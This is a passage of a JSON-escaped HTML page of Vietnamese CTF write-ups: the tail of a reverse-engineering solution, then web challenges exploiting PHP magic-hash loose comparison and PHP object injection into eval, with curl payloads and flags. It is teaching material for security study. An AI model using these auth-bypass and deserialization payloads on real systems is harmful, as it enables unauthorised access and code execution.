!= v10 );\n      v14 = <span class=\"hljs-number\">2</span> * v26;\n      v8 = v26;\n    }\n  }\n  v25 = <span class=\"hljs-number\">4</span> * v8;\n  v9[v14] = <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-keyword\">if</span> ( v8 &gt; <span class=\"hljs-number\">0</span> )\n  {\n    v16 = <span class=\"hljs-number\">0</span>;\n    v17 = v27;\n    <span class=\"hljs-keyword\">do</span>\n    {\n      sub_950(v17, <span class=\"hljs-number\">-1</span>, v19, v23[v16++]);\n      v17 += <span class=\"hljs-number\">2</span>;\n    }\n    <span class=\"hljs-keyword\">while</span> ( v16 &lt; v22 );\n  }\n  v27[v25] = <span class=\"hljs-number\">0</span>;\n  v20 = <span class=\"hljs-built_in\">strcmp</span>(v27, v28) == <span class=\"hljs-number\">0</span>;\n  <span class=\"hljs-built_in\">free</span>(v27);\n  <span class=\"hljs-built_in\">free</span>(v23);\n  <span class=\"hljs-built_in\">free</span>(v21);\n  <span class=\"hljs-built_in\">free</span>(v28);\n  <span class=\"hljs-keyword\">return</span> v20;\n}\n</code></pre>\n<p>B·∫°n c√≥ th·ªÉ ƒë·ªïi type c·ªßa bi·∫øn <code>a1</code> th√†nh <code>JNIEnv*</code>, sau ƒë√≥ code s·∫Ω tr√¥ng r·∫•t ƒë·∫πp. C√°c ƒëo·∫°n code ki·ªÉu nh∆∞:</p>\n<pre><code class=\"language-c\">(*(<span class=\"hljs-type\">void</span> (__cdecl **)(<span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">int</span>, <span class=\"hljs-type\">const</span> <span class=\"hljs-type\">char</span> *))(*(_DWORD *)a1 + <span class=\"hljs-number\">680</span>))(a1, a3, v4);\n</code></pre>\n<p>s·∫Ω ƒë∆∞·ª£c ƒë·ªïi th√†nh</p>\n<pre><code class=\"language-c\">(*a1)-&gt;ReleaseStringUTFChars(a1, (jstring)a3, v4);\n</code></pre>\n<p><strong>C√°ch gi·∫£i 1: static</strong></p>\n<p>Ch·ªâ b·∫±ng vi·ªác ƒë·ªçc code, ta c√≥ th·ªÉ th·∫•y n√≥ l√†m c√°c vi·ªác sau: (vi·∫øt theo syntax python cho ng·∫Øn)</p>\n<ul>\n<li><code>tmp = name + name[::-1]</code></li>\n<li><code>tmp = hex_encode(tmp)</code></li>\n<li>So s√°nh tmp v·ªõi key.</li>\n</ul>\n<p><strong>C√°ch gi·∫£i 2: dynamic</strong></p>\n<ul>\n<li>TODO</li>\n</ul>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{68636d757340666f72746e69676874746867696e74726f664073756d6368}\n</code></pre>\n","list":[]}]},{"name":"Web exploitation","tags":[],"detail":"","list":[{"name":"DameDame","tags":["https://img.shields.io/badge/Category-web-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg","https://img.shields.io/badge/Solves-50-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: Dame dame</h2>\n<p><img src=\"https://img.shields.io/badge/Category-web-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-50-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>MD5 is sooo cool lol. How can people possibly get access to my admin panel, even I can‚Äôt either lmao.</p>\n<h3>Hints</h3>\n<ul>\n<li>none</li>\n</ul>\n<h3>Attached files</h3>\n<p><a href=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/DameDame/index.php\">index.php</a></p>\n<h3>Summary</h3>\n<blockquote>\n<p>Gi·ªõi thi·ªáu v·ªÅ <strong>magic hash</strong></p>\n</blockquote>\n<h3>Detailed solution</h3>\n<p>ƒê√¢y l√† 1 challenge kh√° ƒë∆°n gi·∫£n v√† r·∫•t d·ªÖ th·∫•y v·ªõi nh·ªØng ai ƒë√£ bi·∫øt v·ªÅ thu·∫≠t ng·ªØ <code>magic hash</code>.</p>\n<p>ƒê·ªÉ web app g·ª≠i v·ªÅ flag, 3 ƒëi·ªÅu ki·ªán c·∫ßn ph·∫£i ƒë∆∞·ª£c th·ªèa m√£n:</p>\n<ol>\n<li><code>$_POST[&quot;username&quot;] == $username</code></li>\n<li><code>md5($_POST[&quot;password&quot;]) == md5($password)</code></li>\n<li><code>$_POST[&quot;password&quot;] != $password</code></li>\n</ol>\n<p>ƒê·ªÉ qua ƒë∆∞·ª£c 2 ƒëi·ªÅu ki·ªán ƒë·∫ßu th√¨ ch·ªâ c·∫ßn nh·∫≠p ƒë√∫ng <code>username</code> v√† <code>password</code> c√≥ trong file, nh∆∞ng c√°ch ƒë√≥ s·∫Ω kh√¥ng th·ªèa ƒë∆∞·ª£c ƒëi·ªÅu ki·ªán th·ª© 3. M·ª•c ti√™u hi·ªán t·∫°i l√† c·∫ßn t√¨m ra 1 <code>password</code> sao cho <code>md5($pasword) == md5(&quot;240610708&quot;)</code> v√† <code>$password != &quot;240610708&quot;</code>.</p>\n<p>C√°c b·∫°n c√≥ th·ªÉ th·∫•y ph√©p so s√°nh ƒë∆∞·ª£c s·ª≠ d·ª•ng l√† <code>==</code> thay v√¨ <code>===</code>. C√°ch n√†y kh√¥ng ƒë∆∞·ª£c khuy·∫øn kh√≠ch v√¨ ph√©p so s√°nh <code>==</code> c√≥ th·ªÉ x·∫£y ra nh·ªØng tr∆∞·ªùng h·ª£p ngo·∫°i l·ªá v√¨ PHP s·∫Ω c·ªë ‚Äúcast‚Äù 2 gi√° tr·ªã v·ªÅ c√πng 1 ki·ªÉu d·ªØ li·ªáu v√† so s√°nh.</p>\n<p><img src=\"https://ruempler.eu/2015/01/03/the-php-equality-table/table.png\" alt=\"\"></p>\n<p>ƒêi·ªÅu n√†y d·∫´n ra m·ªôt ph∆∞∆°ng ph√°p t·∫•n c√¥ng v·ªõi nh·ªØng trang web s·ª≠ d·ª•ng authentication b·∫±ng c√°ch hash m·∫≠t kh·∫©u. V√≠ d·ª• v·ªõi snippet sau:</p>\n<pre><code class=\"language-php\"><span class=\"hljs-keyword\">if</span> (<span class=\"hljs-number\">0</span> == <span class=\"hljs-string\">&quot;0e123123123123123&quot;</span>) {\n  <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;equal&quot;</span>;\n}\n</code></pre>\n<p><code>equal</code> s·∫Ω ƒë∆∞·ª£c in ra, v√¨ khi s·ª≠ d·ª•ng ph√©p so s√°nh <code>==</code>, php s·∫Ω th·ª≠ chuy·ªÉn gi√° tr·ªã <code>0e123123123123123</code> v·ªÅ d·∫°ng <code>integer</code>. Khi ƒë√≥, $0^{123123123123123} = 0$</p>\n<p>Nghƒ©a l√† n·∫øu 2 m·∫≠t kh·∫©u ho√†n to√†n kh√°c nhau nh∆∞ng hash c·ªßa ch√∫ng c√≥ d·∫°ng <code>/0e[0-9]+/</code>, vi·ªác s·ª≠ d·ª•ng ph√©p so s√°nh <code>==</code> s·∫Ω l√†m ch∆∞∆°ng tr√¨nh t∆∞·ªüng r·∫±ng ƒë√≥ l√† 1 m·∫≠t kh·∫©u, d·∫´n t·ªõi l·ªó h·ªïng v·ªÅ authentication. C√°c gi√° tr·ªã hash ƒë∆∞·ª£c n√≥i ·ªü tr√™n ƒë∆∞·ª£c g·ªçi chung l√† <code>magic hash</code>.</p>\n<p>V√† t√¨nh c·ªù thay, m·∫≠t kh·∫©u c·ªßa admin trong challenge n√†y c≈©ng l√† m·ªôt magic hash</p>\n<pre><code class=\"language-php\"><span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">md5</span>(<span class=\"hljs-string\">&quot;240610708&quot;</span>); <span class=\"hljs-comment\">// 0e462097431906509019562988736854</span>\n</code></pre>\n<p>T√≥m l·∫°i, ƒë·ªÉ v∆∞·ª£t qua ƒëi·ªÅu ki·ªán th·ª© 3 c·ªßa challenge n√†y th√¨ b·∫°n ch·ªâ c·∫ßn truy·ªÅn ƒë√∫ng <code>username</code> v√† <code>password</code> l√† 1 magic hash c·ªßa h√†m <code>md5</code>, danh s√°ch c√°c magic hash c√≥ th·ªÉ t√¨m th·∫•y r·∫•t nhi·ªÅu tr√™n m·∫°ng, m√¨nh l·∫•y con s·ªë <code>240610708</code> t·ª´ <a href=\"https://github.com/spaze/hashes/blob/master/md5.md\">trang github n√†y</a></p>\n<pre><code class=\"language-bash\">&gt; curl -X POST --url <span class=\"hljs-string\">&quot;http://103.245.249.107:35000/&quot;</span> -d <span class=\"hljs-string\">&quot;username=admin&amp;password=NWWKITQ&quot;</span>\n\nWell <span class=\"hljs-keyword\">done</span>, here is your flag f0rtn1ght{0h_so_M4g1c_h4Sh_i5_a_tH1ng_hUh?}\n</code></pre>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{0h_so_M4g1c_h4Sh_i5_a_tH1ng_hUh?}\n</code></pre>\n","list":[]},{"name":"OOPS","tags":["https://img.shields.io/badge/Category-web-brightgreen.svg","https://img.shields.io/badge/Score_after_CTF-200-blue.svg","https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg","https://img.shields.io/badge/Solves-25-lightgrey.svg"],"detail":"<h2>Fortnight challenge 2022: OOPs (Object oriented programming - supreme)</h2>\n<p><img src=\"https://img.shields.io/badge/Category-web-brightgreen.svg\" alt=\"warmup category\"><br>\n<img src=\"https://img.shields.io/badge/Score_after_CTF-200-blue.svg\" alt=\"score\"><br>\n<img src=\"https://img.shields.io/badge/Author-Hai%20Le%238679-blue.svg\" alt=\"author\"><br>\n<img src=\"https://img.shields.io/badge/Solves-25-lightgrey.svg\" alt=\"solves\"></p>\n<h3>Description</h3>\n<p>Have you ever heard of OOP? Making the code works is one thing, making it maintainable is another thing lol. Just look at my perfectly-designed-OOP code and learn.</p>\n<h3>Hints</h3>\n<ul>\n<li>none</li>\n</ul>\n<h3>Attached files</h3>\n<p><a href=\"https://github.com/compsec-hcmus/hcmus-wu/raw/main/write-up/Fortnight%20Challenge%202022/Web%20exploitation/OOPS/index.php\">index.php</a></p>\n<h3>Summary</h3>\n<blockquote>\n<p>Gi·ªõi thi·ªáu v·ªÅ <strong>object injection in php</strong></p>\n</blockquote>\n<h3>Detailed solution</h3>\n<p>Nh√¨n s∆° qua th√¨ trang web n√†y ƒë√£ setup kh√° c·ªìng k·ªÅnh ch·ªâ ƒë·ªÉ l√†m 1 vi·ªác l√† in ra nh·ªØng g√¨ m√† m√¨nh ƒë√£ nh·∫≠p v√†o. C√°ch ho·∫°t ƒë·ªông s·∫Ω di·ªÖn ra nh∆∞ sau:</p>\n<ol>\n<li>Ng∆∞·ªùi d√πng nh·∫≠p n·ªôi dung v√†o <code>input</code>, h√†m <code>handleSend</code> s·∫Ω t·∫°o ra 1 <code>serialized</code> object v√† base64 encode, sau ƒë√≥ reload l·∫°i trang web k√®m v·ªõi param <code>?msg=&lt;encoded&gt;</code></li>\n<li>Trang web nh·∫≠n param <code>msg</code> v√† gi·∫£i m√£ th√†nh 1 object, sau ƒë√≥ l·∫•y n·ªôi dung c·ªßa <code>msg[&quot;content&quot;]</code> v√† t·∫°o 1 object <code>Logger</code>, kh·ªüi t·∫°o attribute <code>$command = 'echo (&quot;' . $message . '&quot;);'</code></li>\n<li>Class <code>Logger</code> ƒë∆∞·ª£c khai b√°o h√†m <code>_destruct</code>, lu√¥n ƒë∆∞·ª£c g·ªçi khi object b·ªã deallocate, b√™n trong h√†m <code>_destruct</code> s·∫Ω g·ªçi <code>eval($this-&gt;command)</code>.</li>\n<li>N·∫øu qu√° tr√¨nh deserialize c√≥ v·∫•n ƒë·ªÅ, 1 object <code>Logger</code> kh√°c s·∫Ω ƒë∆∞·ª£c g·ªçi ƒë·ªÉ in ra ‚ÄúOops, something happened‚Äù.</li>\n<li>Khi ƒëo·∫°n code ch·∫°y ho√†n t·∫•t, object <code>Logger</code> ƒë∆∞·ª£c kh·ªüi t·∫°o s·∫Ω b·ªã deallocate, g·ªçi h√†m <code>_destruct</code> v√† in ra input m√† b·∫°n ƒë√£ nh·∫≠p.</li>\n</ol>\n<p>V·∫•n ƒë·ªÅ ·ªü qu√° tr√¨nh n√†y ƒë√≥ l√† thay v√¨ nh·∫≠n string <code>input</code>, trang web l·∫°i nh·∫≠n v·ªÅ 1 serialized object <em>c√≥ v·∫ª nh∆∞</em> l√† m·ªôt object ch·ª©a <code>content</code> l√† input c·ªßa ng∆∞·ªùi d√πng. C√°ch l√†m n√†y m·ªü ra m·ªôt ph∆∞∆°ng ph√°p exploit g·ªçi l√† <code>object injection</code>.</p>\n<p>B·ªüi v√¨ h√†m <code>unserialize</code> c√≥ th·ªÉ gi·ªØ nguy√™n c·∫•u tr√∫c c·ªßa 1 object t∆∞∆°ng ·ª©ng v·ªõi 1 class n√†o ƒë√≥, ch√∫ng ta c√≥ th·ªÉ truy·ªÅn m·ªôt serialized object c·ªßa class <code>Logger</code>. V√† v√¨ attribute c·ªßa class n√†y l√† 1 c√¢u l·ªánh ƒë·ªÉ g·ªçi trong h√†m <code>eval</code>, ch√∫ng ta c≈©ng ho√†n to√†n c√≥ th·ªÉ ki·ªÉm so√°t nh·ªØng g√¨ x·∫£y ra trong h√†m n√†y, d·∫´n t·ªõi l·ªói RCE.</p>\n<p>V·∫≠y n√™n ph∆∞∆°ng ph√°p ƒë·ªÉ gi·∫£i challenge n√†y ƒë√≥ l√† khai b√°o class <code>Logger</code> gi·ªëng nh∆∞ tr√™n web, t·∫°o 1 object t∆∞∆°ng ·ª©ng v√† l∆∞u gi√° tr·ªã <code>$command</code> c·ªßa n√≥ th√†nh <code>get_flag();</code>, <code>serialize</code> v√† <code>base64_encode</code> ƒë·ªÉ g·ª≠i cho server. Tuy nhi√™n, v√¨ code ƒë√£ m·∫∑c ƒë·ªãnh coi serialized object l√† <code>Array</code>, v·∫≠y n√™n, object c·∫ßn g·ª≠i s·∫Ω ph·∫£i l√† 1 array c√≥ ch·ª©a object <code>Logger</code>.</p>\n<pre><code class=\"language-bash\">&gt; curl <span class=\"hljs-string\">&quot;http://103.245.249.107:35001/?msg=<span class=\"hljs-subst\">$(echo &#x27;a:1:{i:0;O:6:<span class=\"hljs-string\">&quot;Logger&quot;</span>:1:{s:7:<span class=\"hljs-string\">&quot;command&quot;</span>;s:11:<span class=\"hljs-string\">&quot;get_flag();&quot;</span>;}}&#x27; | base64 --wrap=0)</span>&quot;</span>\n\n&lt;html&gt;\n  &lt;<span class=\"hljs-built_in\">head</span>&gt;\n    &lt;title&gt;Object oriented programming - supreme&lt;/title&gt;\n    &lt;<span class=\"hljs-built_in\">link</span> rel=<span class=\"hljs-string\">&quot;stylesheet&quot;</span> href=<span class=\"hljs-string\">&quot;static/style.css&quot;</span>&gt;\n  &lt;/head&gt;\n\n  &lt;body&gt;\n    &lt;h1&gt;Message echo-er&lt;/h1&gt;\n    &lt;h3&gt;Repeats the messages you want to send to yourself.&lt;/h3&gt;\n    &lt;div class=<span class=\"hljs-string\">&quot;container&quot;</span>&gt;\n      &lt;div <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">&quot;form&quot;</span> class=<span class=\"hljs-string\">&quot;content&quot;</span>&gt;\n        &lt;h2&gt;Send your messages here:&lt;/h2&gt;\n        &lt;input <span class=\"hljs-built_in\">id</span>=<span class=\"hljs-string\">&quot;message&quot;</span> <span class=\"hljs-built_in\">type</span>=<span class=\"hljs-string\">&quot;text&quot;</span> placeholder=<span class=\"hljs-string\">&quot;your message&quot;</span>&gt;\n        &lt;button onclick=<span class=\"hljs-string\">&quot;handleSend()&quot;</span>&gt;\n          Send!\n        &lt;/button&gt;\n      &lt;/div&gt;\n      &lt;div class=<span class=\"hljs-string\">&quot;message&quot;</span>&gt;\n        &lt;h2&gt;Your message&lt;/h2&gt;\n              &lt;/div&gt;\n    &lt;/div&gt;\n\n    &lt;script&gt;\n      <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">handleSend</span></span>() {\n        const elem = document.getElementById(<span class=\"hljs-string\">&quot;message&quot;</span>);\n        const message = elem.value;\n        serialized_obj = `a:1:{s:7:<span class=\"hljs-string\">&quot;content&quot;</span>;s:<span class=\"hljs-variable\">${message.length}</span>:<span class=\"hljs-string\">&quot;<span class=\"hljs-variable\">${message}</span>&quot;</span>;}`;\n\n        console.log(serialized_obj, btoa(serialized_obj));\n\n        document.location = document.location.origin + <span class=\"hljs-string\">&quot;?msg=&quot;</span> + btoa(serialized_obj);\n      }\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;You sent the message: f0rtn1ght{a5_l0ng_As_1t_w0rk5}\n</code></pre>\n<h3>Note</h3>\n<p>V√¨ ng∆∞·ªùi ra ƒë·ªÅ n√†y v·∫´n c√≤n non tay n√™n ƒë√£ kh√¥ng restrict kƒ© h∆°n, cho ph√©p m·ªçi ng∆∞·ªùi t√πy √Ω RCE challenge n√†y, v·∫≠y n√™n m√¨nh r·∫•t c·∫£m ∆°n c√°c b·∫°n tham gia ƒë√£ kh√¥ng l√†m s·∫≠p trang web üôè</p>\n<p>Ngo√†i ra, vi·ªác gh√©p <code>'echo (&quot;' . $message . '&quot;);'</code> nh∆∞ th·∫ø n√†y c≈©ng cho ph√©p RCE m√† kh√¥ng c·∫ßn object injection v√¨ b·∫°n v·∫´n c√≥ th·ªÉ g·ªçi b·∫•t c·ª© h√†m n√†o b·∫±ng c√°ch s·ª≠ d·ª•ng t√≠nh nƒÉng <a href=\"https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing\">string parsing</a> c·ªßa php. N√™n uninteded sol c·ªßa b√†i l√† ch·ªâ c·∫ßn nh·∫≠p <code>${get_flag()}</code> l√† b·∫°n v·∫´n c√≥ th·ªÉ l·∫•y ƒë∆∞·ª£c flag.</p>\n<p>Mong c√°c b·∫°n th·ª© l·ªói</p>\n<h3>Flag</h3>\n<pre><code>f0rtn1ght{a5_l0ng_As_1t_w0rk5}\n</code></pre>\n","list":[]}]}]}]}